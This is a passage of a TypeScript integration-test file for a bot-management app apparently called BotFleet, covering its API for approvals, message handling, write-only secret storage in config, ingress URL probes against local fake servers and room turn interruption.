    const answered = await api("POST", "/api/threads/test-stranded-room-thread/respond", {
      requestId: "stranded-request",
      behavior: "allow",
    });
    expect(answered.status).toBe(200);
    expect(answered.body).toEqual({ ok: true, outcome: "unavailable" });

    const room = (await api("GET", "/api/bots")).body.groups.find(
      (group: { id: string }) => group.id === "test-stranded-room",
    );
    const card = room.messages.find((message: { id: string }) => message.id === "stranded-card").card;
    expect(card.dismissed).toBe(true);
    expect(card.answered).toBe("unavailable");

    // a room with nothing pending still reports that plainly
    const nothing = await api("POST", "/api/threads/test-pinned-room-thread/respond", {
      requestId: "never-existed",
      behavior: "allow",
    });
    expect(nothing.status).toBe(404);
  });

  it("closes the approvals a cancelled turn can no longer answer", async () => {
    // "Cancel turn" is a button ON the approval card, and a pending approval
    // owns the composer. Stopping the turn without closing its card leaves the
    // room blocked by a question whose asker is already gone.
    const stopped = await api("POST", "/api/groups/test-cancel-room/interrupt");
    expect(stopped.status).toBe(200);

    const room = (await api("GET", "/api/bots")).body.groups.find(
      (group: { id: string }) => group.id === "test-cancel-room",
    );
    const card = room.messages.find((message: { id: string }) => message.id === "cancel-card").card;
    expect(card.dismissed).toBe(true);
    expect(card.answered).toBe("unavailable");
  });

  it("rejects an empty message and explains an unavailable provider", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    await api("PATCH", `/api/bots/${bot.id}`, { modelSelection: { instanceId: "ghost", model: "ghost-1" } });

    const empty = await api("POST", `/api/bots/${bot.id}/messages`, { text: "   " });
    expect(empty.status).toBe(400);

    // the seeded bot's selection points at the ghost instance — sending a
    // real message must fail loudly, not 202-and-hang
    const send = await api("POST", `/api/bots/${bot.id}/messages`, { text: "hello?" });
    expect(send.status).toBe(409);
    expect(send.body.error).toContain("unavailable");
    // a failed send never landed a user message, so the first-run quiz stays
    const afterFail = (await api("GET", "/api/bots")).body.bots.find((candidate: { id: string }) => candidate.id === bot.id);
    expect(afterFail.messages.find((m: { kind: string }) => m.kind === "options")?.card.dismissed).toBeFalsy();
  });

  it("drops duplicate self-echo messages that match recent bot text", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    const greeting = bot.messages.find((m: { role: string; text?: string }) => m.role === "bot" && m.text);
    expect(greeting).toBeDefined();

    // Sending the exact bot greeting text back must be dropped as self-echo
    const echoed = await api("POST", `/api/bots/${bot.id}/messages`, { text: greeting.text });
    expect(echoed.status).toBe(200);
    expect(echoed.body.ignored).toBe("self_echo");
  });

  it("refuses to fork a message when the provider is unavailable, without mutating", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    const before = bot.messages.length;

    // greeting is a bot message — not editable
    const greeting = bot.messages.find((m: { role: string }) => m.role === "bot");
    const notUser = await api("POST", `/api/bots/${bot.id}/messages/${greeting.id}/edit`, { text: "x" });
    expect(notUser.status).toBe(404);

    // no user message exists yet, so fabricate the check via the card id
    const card = bot.messages.find((m: { kind: string }) => m.kind === "options");
    const res = await api("POST", `/api/bots/${bot.id}/messages/${card.id}/edit`, { text: "x" });
    expect(res.status).toBe(404); // options card, not a user text message

    const empty = await api("POST", `/api/bots/${bot.id}/messages/${greeting.id}/edit`, { text: "  " });
    expect(empty.status).toBe(400);

    const after = await api("GET", "/api/bots");
    expect(after.body.bots[0].messages.length).toBe(before);
  });

  it("switches the active branch and reports the new leaf", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
    expect(bot.activeLeafId).toBe(bot.messages.at(-1).id);

    // pointing at the first message descends back to the newest leaf on
    // that (only) branch — a no-op switch, but it exercises the descent
    const res = await api("POST", `/api/bots/${bot.id}/active-branch`, { messageId: bot.messages[0].id });
    expect(res.status).toBe(200);
    expect(res.body.activeLeafId).toBe(bot.messages.at(-1).id);

    const missing = await api("POST", `/api/bots/${bot.id}/active-branch`, { messageId: "nope" });
    expect(missing.status).toBe(404);
  });

  it("refuses a box token the provider rejects, at the point of pasting", async () => {
    // the stub answers 401 for anything but the good token
    const bad = await api("PUT", "/api/config", { box: { token: "box_wrong" } });
    expect(bad.status).toBe(400);
    expect(String(bad.body.error)).toMatch(/rejected/i);
    const after = await api("GET", "/api/config");
    expect(after.body.box).toEqual({ configured: false });
  });

  it("saves config keys write-only and reports booleans", async () => {
    const before = await api("GET", "/api/config");
    expect(before.body.box).toEqual({ configured: false });

    const put = await api("PUT", "/api/config", { box: { token: "box_good" } });
    expect(put.status).toBe(200);
    expect(put.body.box).toEqual({ configured: true });
    expect(JSON.stringify(put.body)).not.toContain("box_good");

    const after = await api("GET", "/api/config");
    expect(after.body.box).toEqual({ configured: true });
    expect(JSON.stringify(after.body)).not.toContain("box_good");

    const nothing = await api("PUT", "/api/config", {});
    expect(nothing.status).toBe(400);
  });

  it("validates and persists the global room turn timeout", async () => {
    const before = await api("GET", "/api/config");
    expect(before.status).toBe(200);
    expect(before.body.rooms).toEqual({ turnTimeoutMinutes: 5 });

    for (const turnTimeoutMinutes of [0, 1.5, 1441, "20", null]) {
      const invalid = await api("PUT", "/api/config", { rooms: { turnTimeoutMinutes } });
      expect(invalid.status).toBe(400);
      expect(invalid.body.error).toContain("rooms.turnTimeoutMinutes");
    }

    const saved = await api("PUT", "/api/config", { rooms: { turnTimeoutMinutes: 20 } });
    expect(saved.status).toBe(200);
    expect(saved.body.rooms).toEqual({ turnTimeoutMinutes: 20 });

    const after = await api("GET", "/api/config");
    expect(after.body.rooms).toEqual({ turnTimeoutMinutes: 20 });

    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.rooms).toEqual({ turnTimeoutMinutes: 20 });

    await api("PUT", "/api/config", { rooms: { turnTimeoutMinutes: 5 } });
  });

  it("keeps Teach a skill off by default and persists an explicit opt-in", async () => {
    const before = await api("GET", "/api/config");
    expect(before.status).toBe(200);
    expect(before.body.features).toEqual({ skillRecorder: false, showToolCalls: true, summarizeToolCalls: true });

    const saved = await api("PATCH", "/api/config", {
      features: { skillRecorder: true },
    });
    expect(saved.status).toBe(200);
    expect(saved.body.features).toEqual({ skillRecorder: true, showToolCalls: true, summarizeToolCalls: true });

    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.features).toEqual({ skillRecorder: true });

    const tools = await api("PATCH", "/api/config", { features: { showToolCalls: true } });
    expect(tools.status).toBe(200);
    expect(tools.body.features).toEqual({ skillRecorder: true, showToolCalls: true, summarizeToolCalls: true });

    await api("PATCH", "/api/config", { features: { skillRecorder: false, showToolCalls: false, summarizeToolCalls: true } });
  });

  it("persists usage monitor URL and token without echoing the secret", async () => {
    const saved = await api("PATCH", "/api/config", {
      usage: { ingestUrl: "https://usage.example.com", ingestToken: "tok_secret" },
    });
    expect(saved.status).toBe(200);
    expect(saved.body.usage).toMatchObject({
      ingestUrl: "https://usage.example.com",
      hasToken: true,
    });
    expect(JSON.stringify(saved.body)).not.toContain("tok_secret");

    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.usage).toMatchObject({
      ingestUrl: "https://usage.example.com",
      ingestToken: "tok_secret",
    });

    const merged = await api("PATCH", "/api/config", {
      usage: { ingestUrl: "https://usage.example.com/app" },
    });
    expect(merged.status).toBe(200);
    expect(merged.body.usage.ingestUrl).toBe("https://usage.example.com/app");
    expect(merged.body.usage.hasToken).toBe(true);
    const afterDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(afterDisk.usage.ingestToken).toBe("tok_secret");

    const invalid = await api("PATCH", "/api/config", { usage: { ingestUrl: "usage.example.com" } });
    expect(invalid.status).toBe(400);
    expect(String(invalid.body.error)).toMatch(/absolute http/);

    await api("PATCH", "/api/config", { usage: { ingestUrl: "", ingestToken: "" } });
    const afterClear = await api("POST", "/api/telemetry/test");
    expect(afterClear.status).toBe(200);
    expect(afterClear.body.ok).toBe(false);
    expect(String(afterClear.body.error)).toMatch(/token/i);
  });

  // Diagnostics: the DSN is a write key.  /api/config is broadcast to every
  // window and, with Remote Access on, travels the tunnel, so it may carry
  // the ingest host and nothing more.  The renderer route is the one place
  // the whole DSN is allowed out, and only over loopback.
  it("keeps the Sentry DSN off the broadcast config frame and serves it on the renderer route", async () => {
    // A deliberately fake DSN.  It is never captured against, so nothing on
    // this path opens a socket to it.
    const dsn = "https://abc123@o0.ingest.sentry.io/1";
    try {
      const before = await api("GET", "/api/observability");
      expect(before.status).toBe(200);
      expect(before.body).toMatchObject({
        configured: false,
        enabled: false,
        requestedEnabled: true,
        source: "none",
        dsn: null,
      });

      const unconfigured = await api("POST", "/api/observability/test");
      expect(unconfigured.status).toBe(200);
      expect(unconfigured.body.ok).toBe(false);
      expect(String(unconfigured.body.error)).toMatch(/dsn/i);

      const saved = await api("PATCH", "/api/config", {
        observability: { sentryDsn: dsn, environment: "staging", tracesSampleRate: 0 },
      });
      expect(saved.status).toBe(200);
      expect(saved.body.observability).toMatchObject({
        configured: true,
        enabled: true,
        hasDsn: true,
        host: "o0.ingest.sentry.io",
        source: "config",
        environment: "staging",
        // an explicit zero is a real choice, not a missing value that
        // should fall back to the 0.2 default
        tracesSampleRate: 0,
        logsEnabled: true,
      });
      expect(saved.body.observability.dsn).toBeUndefined();
      expect(JSON.stringify(saved.body)).not.toContain("abc123");

      const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(disk.observability).toMatchObject({ sentryDsn: dsn, environment: "staging" });

      // the renderer cannot start a browser SDK on a host and a project id
      const runtime = await api("GET", "/api/observability");
      expect(runtime.status).toBe(200);
      expect(runtime.body).toMatchObject({ configured: true, enabled: true, source: "config", dsn });

      // the kill switch is explicit and takes effect without a restart
      const off = await api("PATCH", "/api/config", { observability: { enabled: false } });
      expect(off.status).toBe(200);
      expect(off.body.observability).toMatchObject({ configured: true, hasDsn: true, enabled: false });
      const afterOff = await api("GET", "/api/observability");
      expect(afterOff.body.enabled).toBe(false);
      expect(afterOff.body.requestedEnabled).toBe(false);
      const refused = await api("POST", "/api/observability/test");
      expect(refused.body.ok).toBe(false);
      expect(String(refused.body.error)).toMatch(/turned off/i);

      const invalid = await api("PATCH", "/api/config", { observability: { sentryDsn: "http://k@example.com/1" } });
      expect(invalid.status).toBe(400);
      expect(String(invalid.body.error)).toMatch(/DSN/);
    } finally {
      await api("PATCH", "/api/config", { observability: { sentryDsn: "", enabled: true, environment: "" } });
    }

    const cleared = await api("GET", "/api/observability");
    expect(cleared.body).toMatchObject({ configured: false, enabled: false, dsn: null });
  });

  it("persists autoUpdate and ingress without reloading providers", async () => {
    try {
      const saved = await api("PATCH", "/api/config", {
        autoUpdate: { enabled: true },
        ingress: { publicUrl: "https://hooks.example.com" },
      });
      expect(saved.status).toBe(200);
      expect(saved.body.autoUpdate).toMatchObject({ enabled: true });
      // configStatus now also reports the `enabled` flag (defaulting to
      // true); the equality check would break every time that field grows.
      expect(saved.body.ingress).toMatchObject({ publicUrl: "https://hooks.example.com" });

      const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(disk.autoUpdate).toEqual({ enabled: true });
      expect(disk.ingress).toEqual({ publicUrl: "https://hooks.example.com" });

      const invalid = await api("PATCH", "/api/config", { ingress: { publicUrl: "hooks.example.com" } });
      expect(invalid.status).toBe(400);

      // disabling the public URL keeps the value on disk but stops the
      // webhook receiver from advertising it
      const disabled = await api("PATCH", "/api/config", {
        ingress: { publicUrl: "https://hooks.example.com", enabled: false },
      });
      expect(disabled.status).toBe(200);
      expect(disabled.body.ingress).toMatchObject({
        publicUrl: "https://hooks.example.com",
        enabled: false,
      });
      const diskAfter = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(diskAfter.ingress).toEqual({
        publicUrl: "https://hooks.example.com",
        enabled: false,
      });
      const status = await api("GET", "/api/webhooks");
      expect(status.body.ingress.baseUrl).toMatch(/127\.0\.0\.1/);
    } finally {
      await api("PATCH", "/api/config", {
        autoUpdate: { enabled: false },
        ingress: { publicUrl: "" },
      });
    }
  });

  it("POST /api/ingress/test reports a clear failure for malformed URLs", async () => {
    const missing = await api("POST", "/api/ingress/test", { publicUrl: "" });
    expect(missing.status).toBe(200);
    expect(missing.body.ok).toBe(false);
    expect(String(missing.body.reason)).toMatch(/enter a public url/i);

    const wrongScheme = await api("POST", "/api/ingress/test", { publicUrl: "ftp://hooks.example.com" });
    expect(wrongScheme.status).toBe(200);
    expect(wrongScheme.body.ok).toBe(false);
    expect(String(wrongScheme.body.reason)).toMatch(/http|https/);

    const credentials = await api("POST", "/api/ingress/test", {
      publicUrl: "https://user:pass@hooks.example.com",
    });
    expect(credentials.status).toBe(200);
    expect(credentials.body.ok).toBe(false);
    expect(String(credentials.body.reason)).toMatch(/credentials/);
  });

  it("POST /api/ingress/test refuses non-JSON content types", async () => {
    const response = await fetch(`${BASE}/api/ingress/test`, {
      method: "POST",
      headers: { "content-type": "text/plain" },
      body: "https://hooks.example.com",
    });
    expect(response.status).toBe(415);
  });

  it("POST /api/ingress/test reports the tunnel when Cloudflare is in front", async () => {
    // The server runs in a child process, so mocking globalThis.fetch here
    // would not intercept its probe.  Spin up a real local HTTP server and
    // point the probe at it so the test exercises the live follow / parse
    // path without depending on the public internet.
    const fakeOrigin = createServer((_req, res) => {
      res.writeHead(200, {
        server: "cloudflare",
        "cf-ray": "8a1b2c3d4e5f6789-SJC",
      });
      res.end("ok");
    });
    await new Promise<void>((resolve) => fakeOrigin.listen(0, "127.0.0.1", resolve));
    const port = (fakeOrigin.address() as { port: number }).port;
    try {
      const result = await api("POST", "/api/ingress/test", { publicUrl: `http://127.0.0.1:${port}` });
      expect(result.status).toBe(200);
      expect(result.body.ok).toBe(true);
      expect(result.body.tunnel).toBe("cloudflare");
      expect(String(result.body.reason)).toMatch(/cloudflare/i);
    } finally {
      await new Promise<void>((resolve) => fakeOrigin.close(() => resolve()));
    }
  });

  it("POST /api/ingress/test reports 5xx as a failure that still names the tunnel", async () => {
    const fakeOrigin = createServer((_req, res) => {
      res.writeHead(502, { server: "caddy" });
      res.end("upstream");
    });
    await new Promise<void>((resolve) => fakeOrigin.listen(0, "127.0.0.1", resolve));
    const port = (fakeOrigin.address() as { port: number }).port;
    try {
      const result = await api("POST", "/api/ingress/test", { publicUrl: `http://127.0.0.1:${port}` });
      expect(result.status).toBe(200);
      expect(result.body.ok).toBe(false);
      expect(result.body.tunnel).toBe("caddy");
      expect(String(result.body.reason)).toMatch(/502/);
    } finally {
      await new Promise<void>((resolve) => fakeOrigin.close(() => resolve()));
    }
  });

  it("POST /api/ingress/test accepts /api/health only with a real BotFleet payload", async () => {
    const fakeOrigin = createServer((_req, res) => {
      res.writeHead(200, { "content-type": "application/json", server: "cloudflare", "cf-ray": "abc-SJC" });
      res.end(JSON.stringify({ app: "botfleet", pid: 4242, static: true }));
    });
    await new Promise<void>((resolve) => fakeOrigin.listen(0, "127.0.0.1", resolve));
    const port = (fakeOrigin.address() as { port: number }).port;
    try {
      const result = await api("POST", "/api/ingress/test", {
        publicUrl: `http://127.0.0.1:${port}/api/health`,
      });
      expect(result.status).toBe(200);
      expect(result.body.ok).toBe(true);
      expect(result.body.tunnel).toBe("cloudflare");
    } finally {
      await new Promise<void>((resolve) => fakeOrigin.close(() => resolve()));
    }
  });

  it("POST /api/ingress/test rejects an /api/health probe that answers 200 without the BotFleet payload", async () => {
    // Stands in for a Cloudflare Access login page: the probe follows the
    // redirect, the edge answers 200, but the body is not BotFleet's own
    // health JSON, so this must not read as a live origin.
    const fakeOrigin = createServer((_req, res) => {
      res.writeHead(200, { "content-type": "text/html", server: "cloudflare", "cf-ray": "abc-SJC" });
      res.end("<html>Sign in to continue</html>");
    });
    await new Promise<void>((resolve) => fakeOrigin.listen(0, "127.0.0.1", resolve));
    const port = (fakeOrigin.address() as { port: number }).port;
    try {
      const result = await api("POST", "/api/ingress/test", {
        publicUrl: `http://127.0.0.1:${port}/api/health`,
      });
      expect(result.status).toBe(200);
      expect(result.body.ok).toBe(false);
      expect(String(result.body.reason)).toMatch(/BotFleet health payload/i);
    } finally {
      await new Promise<void>((resolve) => fakeOrigin.close(() => resolve()));
    }
  });

  it(
    "POST /api/ingress/test does not hang when /api/health answers promptly but stalls its body",
    { timeout: 15_000 },
    async () => {
      // Regression for a P2 finding: headers must arrive fast while the body
      // never finishes, so a probe that only bounds `fetch()` itself (and
      // clears the abort timer once headers land) would leave
      // `response.json()` unbounded and hang forever. The fix keeps the
      // 5s abort timer armed through body consumption.
      const fakeOrigin = createServer((_req, res) => {
        res.writeHead(200, { "content-type": "application/json", server: "cloudflare" });
        res.write('{"app":"botfleet"'); // never closes the object, never calls res.end()
      });
      await new Promise<void>((resolve) => fakeOrigin.listen(0, "127.0.0.1", resolve));
      const port = (fakeOrigin.address() as { port: number }).port;
      try {
        const started = Date.now();
        const result = await api("POST", "/api/ingress/test", {
          publicUrl: `http://127.0.0.1:${port}/api/health`,
        });
        const elapsedMs = Date.now() - started;
        expect(result.status).toBe(200);
        expect(result.body.ok).toBe(false);
        // Bounded by the probe's own 5s abort timer, not left hanging on the
        // stalled body. Generous slack above the 5s bound for CI jitter.
        expect(elapsedMs).toBeLessThan(9_000);
      } finally {
        fakeOrigin.closeAllConnections();
        await new Promise<void>((resolve) => fakeOrigin.close(() => resolve()));
      }
    },
  );

  it("POST /api/ingress/test reports a fetch error when the origin is unreachable", async () => {
    // A local port that nothing is listening on: the OS rejects the
    // connection with ECONNREFUSED, which is exactly the upstream-originated
    // error we want the server to surface.
    const result = await api("POST", "/api/ingress/test", { publicUrl: "http://127.0.0.1:1" });
    expect(result.status).toBe(200);
    expect(result.body.ok).toBe(false);
    expect(String(result.body.reason)).toMatch(/ECONNREFUSED|did not answer|fetch failed/i);
  });

  it("GET /api/infisical/status reports unconfigured state and field rows without secrets", async () => {
    const res = await api("GET", "/api/infisical/status");
    expect(res.status).toBe(200);
    expect(res.body.infisical).toBeDefined();
    expect(res.body.infisical.configured).toBe(false);
    expect(Array.isArray(res.body.fields)).toBe(true);
    for (const field of res.body.fields) {
      if (field.secret) expect(field.value).toBeNull();
    }
  });

  it("names ~/.mmx/config.json on the MiniMax ENDPOINT row when that file chooses the host", async () => {
    // The row has to report the endpoint actually in effect.  With no
    // workspace url saved, the reserved MiniMax instance calls whatever host
    // ~/.mmx/config.json names — so a blank field with no badge told the
    // operator "MiniMax's global host" while turns went to the China region.
    // Only the PATH ever reaches the payload; the file's contents do not,
    // exactly as for the key row beside it.
    const urlRow = async () =>
      (await api("GET", "/api/infisical/status")).body.fields.find((f: any) => f.id === "minimax.url");
    expect((await urlRow()).elsewhere).toBeNull();

    const mmxDir = join(home, ".mmx");
    mkdirSync(mmxDir, { recursive: true });
    try {
      // No api_key in here on purpose: this asserts the ENDPOINT probe alone.
      writeFileSync(join(mmxDir, "config.json"), JSON.stringify({ region: "cn" }));
      const chosen = await urlRow();
      expect(chosen.elsewhere).toBe("~/.mmx/config.json");
      expect(chosen.value).toBe("");
      expect(JSON.stringify(chosen)).not.toContain("region");
      // The key row is untouched — that file names no key.
      const keyRow = (await api("GET", "/api/infisical/status")).body.fields
        .find((f: any) => f.id === "minimax.key");
      expect(keyRow.elsewhere).toBeNull();

      // A profile that names the global host is what "blank means global"
      // actually looks like, so it earns no badge at all.
      writeFileSync(join(mmxDir, "config.json"), JSON.stringify({ region: "global" }));
      expect((await urlRow()).elsewhere).toBeNull();
    } finally {
      rmSync(mmxDir, { recursive: true, force: true });
    }
    expect((await urlRow()).elsewhere).toBeNull();
  });

  it("POST /api/infisical/test reports requirement to add machine identity when unconfigured", async () => {
    const res = await api("POST", "/api/infisical/test");
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(String(res.body.error)).toMatch(/machine identity|project id/i);
  });

  it("rejects PATCH /api/config combining Infisical settings and credentials", async () => {
    const res = await api("PATCH", "/api/config", {
      infisical: { environment: "staging" },
      xai: { key: "new-xai-key" },
    });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/Updating Infisical settings and credentials in the same request is not supported/);
  });

  it("keeps shared Local VM mode by default and resolves isolated targets per bot when enabled", async () => {
    const first = (await api("POST", "/api/bots")).body.bot;
    const second = (await api("POST", "/api/bots")).body.bot;
    const before = await api("GET", "/api/config");
    expect(before.body.localVm).toEqual({ mode: "shared", maxInstances: 2 });

    const shared = await api("GET", `/api/bots/${first.id}/local-computer`);
    expect(shared.status).toBe(200);
    expect(shared.body).toMatchObject({ mode: "shared", target_key: "shared" });

    const saved = await api("PATCH", "/api/config", {
      localVm: { mode: "per-bot", maxInstances: 3 },
    });
    expect(saved.status).toBe(200);
    expect(saved.body.localVm).toEqual({ mode: "per-bot", maxInstances: 3 });

    const [firstStatus, secondStatus] = await Promise.all([
      api("GET", `/api/bots/${first.id}/local-computer`),
      api("GET", `/api/bots/${second.id}/local-computer`),
    ]);
    expect(firstStatus.body).toMatchObject({ mode: "per-bot", max_instances: 3 });
    expect(secondStatus.body).toMatchObject({ mode: "per-bot", max_instances: 3 });
    expect(firstStatus.body.target_key).not.toBe(secondStatus.body.target_key);
    expect(firstStatus.body.container_name).not.toBe(secondStatus.body.container_name);
    expect(firstStatus.body.workspace_path).not.toBe(secondStatus.body.workspace_path);

    const invalid = await api("PATCH", "/api/config", { localVm: { maxInstances: 5 } });
    expect(invalid.status).toBe(400);
    expect(invalid.body.error).toContain("localVm.maxInstances");

    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.localVm).toEqual({ mode: "per-bot", maxInstances: 3 });
    await api("PATCH", "/api/config", { localVm: { mode: "shared", maxInstances: 2 } });
  });

  it("keeps an active turn alive when only the room timeout changes", async () => {
    const created = await api("POST", "/api/bots", {});
    const botId = created.body.bot.id;
    const room = (await api("POST", "/api/groups", {
      name: "Room timeout capture",
      memberIds: [botId],
    })).body.group;
    const ready = await api("PATCH", `/api/groups/${room.id}/setup`, { action: "skip" });
    expect(ready.status).toBe(200);
    try {
      const selected = await api("PATCH", `/api/bots/${botId}`, {
        modelSelection: { instanceId: "claude", model: "claude-sonnet-5" },
      });
      expect(selected.status).toBe(200);

      rmSync(fakeClaudeDump, { force: true });
      const sent = await api("POST", `/api/groups/${room.id}/messages`, { text: "stay active" });
      expect(sent.status).toBe(202);
      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);

      const before = (await api("GET", "/api/bots")).body;
      expect(before.bots.find((bot: { id: string }) => bot.id === botId)?.busy).toBe(true);
      expect(before.groups.find((group: { id: string }) => group.id === room.id)?.busyBotId).toBe(botId);

      const saved = await api("PUT", "/api/config", { rooms: { turnTimeoutMinutes: 20 } });
      expect(saved.status).toBe(200);

      const after = (await api("GET", "/api/bots")).body;
      expect(after.bots.find((bot: { id: string }) => bot.id === botId)?.busy).toBe(true);
      const activeRoom = after.groups.find((group: { id: string }) => group.id === room.id);
      expect(activeRoom?.busyBotId).toBe(botId);
      expect(activeRoom.messages.some((message: { tool?: { name?: string } }) =>
        message.tool?.name?.includes("provider settings changed"),
      )).toBe(false);
    } finally {
      await api("POST", `/api/groups/${room.id}/interrupt`);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots")).body;
        return {
          botBusy: state.bots.find((bot: { id: string }) => bot.id === botId)?.busy,
          roomBusyBotId: state.groups.find((group: { id: string }) => group.id === room.id)?.busyBotId,
        };
      }, { timeout: 5_000 }).toEqual({ botBusy: false, roomBusyBotId: null });
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${botId}`);
      await api("PUT", "/api/config", { rooms: { turnTimeoutMinutes: 5 } });
    }
  });

  it("tracks and interrupts the whole queued channel turn", async () => {
    const first = (await api("POST", "/api/bots", {})).body.bot;
    const second = (await api("POST", "/api/bots", {})).body.bot;
    const room = (await api("POST", "/api/groups", {
      name: "Queued channel turn",
      memberIds: [first.id, second.id],
      setup: { bulletin: "", defaultResponder: { kind: "everyone" } },
    })).body.group;
    try {
      for (const bot of [first, second]) {
        const selected = await api("PATCH", `/api/bots/${bot.id}`, {
          modelSelection: { instanceId: "claude", model: "claude-sonnet-5" },
        });
        expect(selected.status).toBe(200);
      }

      const sent = await api("POST", `/api/groups/${room.id}/messages`, {
        text: "both bots should answer",
        threadId: room.threadId,
      });
      expect(sent.status).toBe(202);

      // The operation is registered before any awaited provider setup. Polling
      // and structural guards therefore cannot see a false idle window.
      const immediate = (await api("GET", "/api/bots?messages=0")).body;
      expect(immediate.groups.find((group: { id: string }) => group.id === room.id)?.working).toBe(true);
      expect((await api("POST", `/api/groups/${room.id}/tasks`, { title: "Too soon" })).status).toBe(409);
      expect((await api("PATCH", `/api/groups/${room.id}`, { memberIds: [first.id] })).status).toBe(409);

      const interrupted = await api("POST", `/api/groups/${room.id}/interrupt`, {
        threadId: room.threadId,
      });
      expect(interrupted.status).toBe(200);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body;
        const currentRoom = state.groups.find((group: { id: string }) => group.id === room.id);
        return {
          working: currentRoom?.working,
          busyBotId: currentRoom?.busyBotId,
          busyBots: state.bots
            .filter((bot: { id: string; busy: boolean }) =>
              (bot.id === first.id || bot.id === second.id) && bot.busy,
            )
            .map((bot: { id: string }) => bot.id),
        };
      }, { timeout: 5_000 }).toEqual({ working: false, busyBotId: null, busyBots: [] });

      // Cancellation must be durable for the queued remainder, not merely
      // interrupt whichever responder happened to own the process.
      await new Promise((resolve) => setTimeout(resolve, 250));
      const settled = (await api("GET", "/api/bots?messages=0")).body;
      expect(settled.groups.find((group: { id: string }) => group.id === room.id)?.working).toBe(false);
      expect(settled.bots.filter((bot: { id: string; busy: boolean }) =>
        (bot.id === first.id || bot.id === second.id) && bot.busy,
      )).toHaveLength(0);
    } finally {
      await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId });
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${first.id}`);
      await api("DELETE", `/api/bots/${second.id}`);
    }
  });

  it("tracks and cancels a queued channel credential continuation before provider dispatch", async () => {
    const first = (await api("POST", "/api/bots", {})).body.bot;
    const second = (await api("POST", "/api/bots", {})).body.bot;
    const room = (await api("POST", "/api/groups", {
      name: "Credential continuation",
      memberIds: [first.id, second.id],
      setup: { bulletin: "", defaultResponder: { kind: "member", botId: first.id } },
    })).body.group;
    try {
      for (const bot of [first, second]) {
        const selected = await api("PATCH", `/api/bots/${bot.id}`, {
          modelSelection: { instanceId: "claude", model: "claude-sonnet-5" },
        });
        expect(selected.status).toBe(200);
      }

      rmSync(fakeClaudeDump, { force: true });
      expect((await api("POST", `/api/groups/${room.id}/messages`, { text: "start the lead" })).status).toBe(202);
      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);
      const firstDump = JSON.parse(readFileSync(fakeClaudeDump, "utf8")) as {
        pid: number;
        mcpConfig: { mcpServers: { agents: { env: { OMB_COMMS_TOKEN: string } } } };
      };
      const token = firstDump.mcpConfig.mcpServers.agents.env.OMB_COMMS_TOKEN;
      expect(token).toMatch(/^[a-f0-9]{48}$/);

      const requested = await fetch(`${BASE}/api/internal/request-credential`, {
        method: "POST",
        headers: {
          authorization: `Bearer ${token}`,
          "content-type": "application/json",
        },
        body: JSON.stringify({
          fromBotId: second.id,
          fromThreadId: room.threadId,
          credentialId: "openaiImageApiKey",
          reason: "needed for the queued task",
        }),
      });
      expect(requested.status).toBe(201);
      const { messageId } = (await requested.json()) as { messageId: string };

      const resumed = await api("POST", `/api/bots/${second.id}/secret-cards/${messageId}/dismiss`, {
        threadId: room.threadId,
      });
      expect(resumed).toEqual({ status: 200, body: { dismissed: true, resumed: true } });

      const queued = (await api("GET", "/api/bots?messages=0")).body;
      expect(queued.groups.find((group: { id: string }) => group.id === room.id)?.working).toBe(true);
      const deletion = await api("DELETE", `/api/groups/${room.id}`);
      expect(deletion.status).toBe(409);
      expect(deletion.body.error).toMatch(/working/i);

      expect((await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId })).status).toBe(200);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body;
        return {
          working: state.groups.find((group: { id: string }) => group.id === room.id)?.working,
          secondBusy: Boolean(state.bots.find((bot: { id: string }) => bot.id === second.id)?.busy),
        };
      }, { timeout: 5_000 }).toEqual({ working: false, secondBusy: false });

      // The continuation sat behind the lead's hanging provider. Interrupting
      // the room must cancel it before a second provider process is spawned.
      await new Promise((resolve) => setTimeout(resolve, 250));
      expect(JSON.parse(readFileSync(fakeClaudeDump, "utf8")).pid).toBe(firstDump.pid);
    } finally {
      await api("POST", `/api/groups/${room.id}/interrupt`, { threadId: room.threadId });
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body;
        return state.groups.find((group: { id: string }) => group.id === room.id)?.working;
      }, { timeout: 5_000 }).toBe(false);
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${first.id}`);
      await api("DELETE", `/api/bots/${second.id}`);
    }
  });

  it("keeps chat-created routines inert until their durable card is confirmed", async () => {
    const bot = (await api("POST", "/api/bots", {})).body.bot;
    let routineId = "";
    let legacyRoutineId = "";
    const bulkRoutineIds: string[] = [];
    try {
      const selected = await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: "claude-sonnet-5" },
      });
      expect(selected.status).toBe(200);

      rmSync(fakeClaudeDump, { force: true });
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "prepare a routine" })).status).toBe(202);
      await expect.poll(() => existsSync(fakeClaudeDump), { timeout: 5_000 }).toBe(true);
